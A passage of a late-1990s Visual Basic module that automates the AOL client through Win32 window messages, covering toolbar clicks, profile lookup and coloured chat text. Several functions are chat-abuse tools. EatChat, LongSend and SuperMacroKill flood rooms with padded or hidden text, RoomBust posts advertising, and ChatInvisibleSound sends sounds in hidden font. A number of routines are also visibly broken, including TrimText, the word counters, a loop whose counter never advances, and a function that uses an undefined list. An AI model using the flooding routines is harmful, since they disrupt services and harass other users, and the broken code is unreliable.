    tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, Vk_Up, 0&)
    Call PostMessage(sMod&, WM_KEYUP, Vk_Up, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, Vk_Up, 0&)
    Call PostMessage(sMod&, WM_KEYUP, Vk_Up, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        pgWindow& = FindWindowEx(mdi&, 0&, "AOL Child", "Get a Member's Profile")
        pgEdit& = FindWindowEx(pgWindow&, 0&, "_AOL_Edit", vbNullString)
        pgButton& = FindWindowEx(pgWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pgWindow& <> 0& And pgEdit& <> 0& And pgButton& <> 0&
    Call sendmessagebystring(pgEdit&, WM_SETTEXT, 0&, ScreenName$)
    Call SendMessage(pgButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(pgButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        pWindow& = FindWindowEx(mdi&, 0&, "AOL Child", "Member Profile")
        pTextWindow& = FindWindowEx(pWindow&, 0&, "_AOL_View", vbNullString)
        pString$ = GetText(pTextWindow&)
        NoWindow& = FindWindow("#32770", "America Online")
    Loop Until pWindow& <> 0& And pTextWindow& <> 0& Or NoWindow& <> 0&
    DoEvents
    If NoWindow& <> 0& Then
        OKButton& = FindWindowEx(NoWindow&, 0&, "Button", "OK")
        Call SendMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = "< No Profile >"
    Else
        Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = pString$
    End If
End Function
Function ScrollProfile(SN)
Profile = GetProfile(SN)
pause 1.5
Call scroll(Profile)
End Function
Function Jello(frm As Form)
If frm.WindowState = 2 Or frm.WindowState = 1 Then
MsgBox ("Function cannot be performed while" & Chr(13) & "         window is maximized.."), 16, ("Error    Press OK to resume program")
Exit Function
End If
frm.Show
Dim i, l, t, W, H As Integer
l = frm.Left
t = frm.Top
W = frm.Width
H = frm.Height
For i = 1 To 10
frm.Move (l + 50), (t + 25), W, H
pause (0.001)
frm.Move (l + 60), (t + 45), W, H
pause (0.001)
frm.Move (l + 40), (t + 20), W, H
pause (0.001)
frm.Move (l + 30), (t + 35), W, H
pause (0.001)
frm.Move (l + 15), (t + 10), W, H
pause (0.001)
Next i
frm.Move l, t, W, H
End Function
Function Jello4ever(frm As Form)
If frm.WindowState = 2 Or frm.WindowState = 1 Then
MsgBox ("Function cannot be performed while" & Chr(13) & "         window is maximized.."), 16, ("Error    Press OK to resume program")
Exit Function
End If
frm.Show
Dim i, l, t, W, H As Integer
l = frm.Left
t = frm.Top
W = frm.Width
H = frm.Height
Do
For i = 1 To 10
frm.Move (l + 50), (t + 25), W, H
pause (0.001)
frm.Move (l + 60), (t + 45), W, H
pause (0.001)
frm.Move (l + 40), (t + 20), W, H
pause (0.001)
frm.Move (l + 30), (t + 35), W, H
pause (0.001)
frm.Move (l + 15), (t + 10), W, H
pause (0.001)
Next i
frm.Move l, t, W, H
Loop
End Function
Function RandomNum(Last)
'creates a random number from 1 to last
X = Int(Rnd * Last + 1)
        RandomNum = X
End Function
Function RoomBust(RoomName As String, Advertise As String)
Dim Chil%, Rich%
Dim t As Integer
Chil% = FindChatRoom
Rich% = FindChildByClass(Chil%, "RICHCNTL")
    If Rich% <> 0 Then
        closeroom = SendMessage(Chil%, WM_CLOSE, 0, 0&)
    End If
Do: DoEvents
t = Val(t) + 1
Call GotoRoom(RoomName)
Wait (0.3)
If InRoom = True Or t = 20 Then Exit Do
Loop
If t = 20 Then
MsgBox ("Because of AOL's new updates I cant bust more than 20 x's"), 16, ("RoomBust Timeout")
End If
pause (0.2)
SendChat (Advertise)
End Function
Function GotoRoom(room As String)
aol% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(aol%, "AOL Toolbar")
toolb% = FindChildByClass(tool%, "_AOL_Toolbar")
Comb% = FindChildByClass(toolb%, "_AOL_Combobox")
Edi% = FindChildByClass(Comb%, "Edit")
fillit = sendmessagebystring(Edi%, WM_SETTEXT, 0, "aol://2719:2-2-" & room)
clickit = SendMessageByNum(Edi%, WM_CHAR, VK_SPACE, 0&)
clickit = SendMessageByNum(Edi%, WM_CHAR, 13, 0&)
Wait (0.3)
Nope% = FindWindow("#32770", vbNullString)
If Nope% <> 0 Then
closeit = SendMessage(Nope%, WM_CLOSE, 0, 0&)
End If
End Function
Function ScrollMultilineTxtBx(Txt As TextBox)
Txt.Text = " " & Txt.Text & Chr(13)
Dim i As Integer
For i = 1 To Len(Txt.Text)
l$ = Mid(Txt.Text, i, 1)
If l$ = Chr(13) Then
Call ChatSend(Mid(TLine$, 2, Len(TLine$))): TLine$ = "": l$ = ""
pause (0.5)
End If
TLine$ = TLine$ & l$
Next i
Txt.Text = Mid(Txt.Text, 2, Len(Txt.Text) - 2)
End Function
Function ChatInvisibleSound(WavName As String)
Call SendChat("<Font Color=" & Chr(34) & "#FFFFFE" & Chr(34) & ">{S " & WavName)
End Function
Function Toolbar_WriteMail()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_MailCenter()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_PrintAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_MyFiles()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_MyAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Favorites()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Internet()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Chanels()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_People()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Quotes()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Perks()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
ClickIcon (aoicon%)
End Function
Function Toolbar_Weather()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)
aoicon% = GetWindow(aoicon%, 2)

ClickIcon (aoicon%)
End Function
Function SmoothFormRoll(frm As Form, frmHeight)
' All the other bas's that i used make it so complex-
' I invented a new way to do this stuff eith out involving
' More than 6 lines of code!
frm.Show
    Dim i, j As Integer
    For i = j To frmHeight
        DoEvents
        frm.Height = i
    Next i
End Function
Function CloseBuddyWin()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
buddy% = FindChildByTitle(mdi%, "Buddy List Window")
closebuddies = SendMessage(buddy%, WM_CLOSE, 0, 0)
If buddy% = 0 Then
MsgBox "Buddies isnt even open dumbazz!", vbCritical, "Error"
End If
End Function
Function OpenBuddies()
Call KeyWord("BuddyView")
End Function
Function IsUserOnline2()
'This one is better than IsUserOnline (the first 1)
'cause in some progs the user closes the welcome menu, and
'IsUserOnline1 uses the welcome menu, this is much better!
Call KeyWord("Preferences")
pause 1.5
Dim isntonline, IsOnline
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByClass(X, "MDIClient")
z = FindChildByTitle(Y, "Preferences")
aoicon% = FindChildByClass(z, "_AOL_Icon")
For GetIcon = 1 To 14
    aoicon% = GetWindow(aoicon%, 2)
Next GetIcon
ClickIcon (aoicon%)
pause 1
IsOnline = FindChildByClass(X, "#32770")
If IsOnline <> 0 Then
isntonline = 1
Else:
IsOnline = 0
End If
End Function
Function ClickMenu(Mnu_str$)
aol% = FindWindow("AOL Frame25", 0&)
mnu% = GetMenu(aol%)
MNU_Count% = GetMenuItemCount(mnu%)
For Top_Level% = 0 To MNU_Count% - 1
    Sub_Mnu% = GetSubMenu(mnu%, Top_Level%)
    Sub_Count% = GetMenuItemCount(Sub_Mnu%)
    For Sub_level% = 0 To Sub_Count% - 1
        Buff$ = space$(50)
        junk% = GetMenuString(Sub_Mnu%, Sub_level%, Buff$, 50, MF_BYPOSITION)
        Buff$ = Trim$(Buff$): Buff$ = Left(Buff$, Len(Buff$) - 1)
        If Buff$ = "" Then Buff$ = " -"
        If InStr(Buff$, Mnu_str$) Then
            Mnu_ID% = GetMenuItemID(Sub_Mnu%, Sub_level%)
            junk% = SendMessageByNum(aol%, WM_COMMAND, Mnu_ID%, 0)
        End If
    Next Sub_level%
Next Top_Level%
End Function
Sub GradientBG(TheForm As Form)
Dim hBrush%
    Dim FormHeight%, Red%, StepInterval%, X%, RetVal%, OldMode%
    Dim FillArea As RECT
    OldMode = TheForm.ScaleMode
    TheForm.ScaleMode = 3
    FormHeight = TheForm.ScaleHeight
    StepInterval = FormHeight \ 63
    Red = 255
    FillArea.Left = 0
    FillArea.Right = TheForm.ScaleWidth
    FillArea.Top = 0
    FillArea.Bottom = StepInterval
    For X = 1 To 63
        hBrush% = CreateSolidBrush(RGB(0, 0, Red))
        RetVal% = FillRect(TheForm.hDC, FillArea, hBrush)
        RetVal% = DeleteObject(hBrush)
        Red = Red - 4
        FillArea.Top = FillArea.Bottom
        FillArea.Bottom = FillArea.Bottom + StepInterval
    Next
    FillArea.Bottom = FillArea.Bottom + 63
    hBrush% = CreateSolidBrush(RGB(0, 0, 0))
    RetVal% = FillRect(TheForm.hDC, FillArea, hBrush)
    RetVal% = DeleteObject(hBrush)
    TheForm.ScaleMode = OldMode
End Sub
Function DisableWindow(WinClass)
X = EnableWindow(WinClass, 0)
End Function
Function TrimText(ByVal Str As String)
Dim X As Integer
Dim Y As String
Dim z As String
For X = 1 To Len(Str)
Y = Mid(Str, X, 1)
If Y = Chr(0) Then Y = ""
z = z & Y
Next X
z = trimedtext
End Function

Sub FadeFormYellow(vform As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub
Sub FadeFormGreen(vform As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vform As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vform As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub
Sub FadeFormRed(vform As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub
Sub txtbxWordCount(Txt As TextBox)
X = Len(Txt)
Count = Mid(X, 0)
Count = txtbxWordCount
End Sub
Sub WordCount(Str As String)
X = Len(Str)
Count = Mid(X, 0)
Count = WordCount
End Sub
Function SuperMacroKill(Str As String, NumOfTimes As Integer)
'This will scroll the number of times as a super scroll
Dim Numero As Integer
Dim ruby As Integer
Numero = NumOfTimes
ruby = 0
Do
pause 0.5
Call LongSend(Str)
X = Val(ruby) + 1
Loop Until ruby <> Numero
End Function
Sub LongSend(Txt)
For i = 1 To 100
a = a + Txt
Next
SendChat ".<p=" & a
End Sub
Function EatChat()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 1940
a = a + ""
Next
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & a)
timeout 0.7
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & a)
timeout 0.7
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & a)
End Function
Sub FileSize(file$)
Exists = Len(Dir$(file$))
If Err Or Exists = 0 Then Exit Sub
TheLength = FileLen(file$)
End Sub
Function TextSpaced(Strin As TextBox)
Let inptxt$ = Strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + " "
Let Newsent$ = Newsent$ + NextChr$
Loop
TextSpaced = Newsent$
End Function
Sub FadeFormCircus(vform As Form)
Dim Dog As Integer
For Dog = 0 To 255
    On Error Resume Next
    Dim intLoop As Integer
    vform.DrawStyle = vbInsideSolid
    vform.DrawMode = vbCopyPen
    vform.ScaleMode = vbPixels
    vform.DrawWidth = 2
    vform.ScaleHeight = 256
    For intLoop = 0 To 255
        vform.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, Dog, 255 - intLoop), B
    Next intLoop
    Next Dog
End Sub
Sub FormInvisible(frm As Form)
 Dim a, B, c, D, Desk&
       a = Screen.TwipsPerPixelX
       B = Screen.TwipsPerPixelY
       c = frm.Top / B
       D = frm.Left / a
       Desk& = GetDesktopWindow
       BitBlt frm.hDC, 0, 0, frm.Width, frm.Height, GetDC(Desk&), D, c, SRCCOPY
End Sub
Sub PauseHour(NumOfHour As Integer)
Dim Saw, La As Integer
Saw = 0
La = NumOfHour
Do
La = Val(La) + 1
pause (3600)
Loop Until La <> Saw
End Sub
Sub PauseMin(NumOfMin As Integer)
Dim Saw, La As Integer
Saw = 0
La = NumOfMin
Do
La = Val(Saw) + 1
pause (60)
Loop Until La <> Saw
End Sub
Function FindIM()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(mdi%, "  Instant Message To:")
If IM% <> 0 Then
   FindIM = 1
Else:
   FindIM = 0
End If
End Function
Sub ExitMsgBx()
Dim B
B = MsgBox("Are you sure you want to exit?", 36, "Exit")
Select Case B
Case 6: End
End Select
End Sub
Function RedBlackText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        f = e * B
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedBlack = msg
SendChat (msg)
End Function

Function RedBlackRedText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        f = e * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedBlackRed = msg
SendChat (msg)
End Function

Function RedBlueText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        f = e * B
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedBlue = msg
SendChat (msg)
End Function
Function RedBlueRedText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        f = e * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedBlueRed = msg
SendChat (msg)
End Function

Function RedGreenText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        f = e * B
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedGreen = msg
SendChat (msg)
End Function
Function RedGreenRedText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        f = e * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedGreenRed = msg
SendChat (msg)
End Function
Function RedPurpleText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        f = e * B
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedPurple = msg
SendChat (msg)
End Function
Function RedPurpleRed(TextText1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        f = e * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedPurpleRed = msg
SendChat (msg)
End Function
Function RedYellowText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        f = e * B
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedYellow = msg
SendChat (msg)
End Function

Function RedYellowRedText(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        f = e * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    RedYellowRed = msg
SendChat (msg)
End Function
Sub IMansweringMacjine2(message)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

IM% = FindChildByTitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(IM%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e2, GW_HWNDNEXT)
Call sendmessagebystring(e2, WM_SETTEXT, 0, message)
AOLIcon (e)
Call timeout(0.8)
IM% = FindChildByTitle(mdi%, "  Instant Message From:")
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
AOLIcon (e)
End Sub

Function RGBtoHEX(RGB)
    a = Hex(RGB)
    B = Len(a)
    If B = 5 Then a = "0" & a
    If B = 4 Then a = "00" & a
    If B = 3 Then a = "000" & a
    If B = 2 Then a = "0000" & a
    If B = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function
Sub SpiralScroll(Str As String)
X = Str
thastart:
Dim MYLEN As Integer
MyString = Str
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Str = MYSTR
SendChat (Str)
If Str = X Then
Exit Sub
End If
GoTo thastart
End Sub
Sub SpiralScroll2(Txt As TextBox)
X = Txt.Text
thastart:
Dim MYLEN As Integer
MyString = Txt.Text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Txt.Text = MYSTR
timeout 1
AOLChatSend Txt
If Txt.Text = X Then
Exit Sub
End If
GoTo thastart
End Sub
Sub RemoveFromList(List As ListBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(lst.List(a)) = LCase$(item$) Then lst.RemoveItem (a)
a = 1 + a
Loop Until a >= lst.ListCount
End Sub
Sub AddRoomWithoutMe(lst As ListBox)
Call AddRoomToListBox(lst)
pause 0.5
User = UserSN
Call RemoveFromList(lst, User)
End Sub
Function ChatRoomCount()
Chat% = FindChatRoom
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Sub HardDrive_FreeBytes()
fb = CurrentDisk.FreeBytes
fb = FreeBytes
End Sub
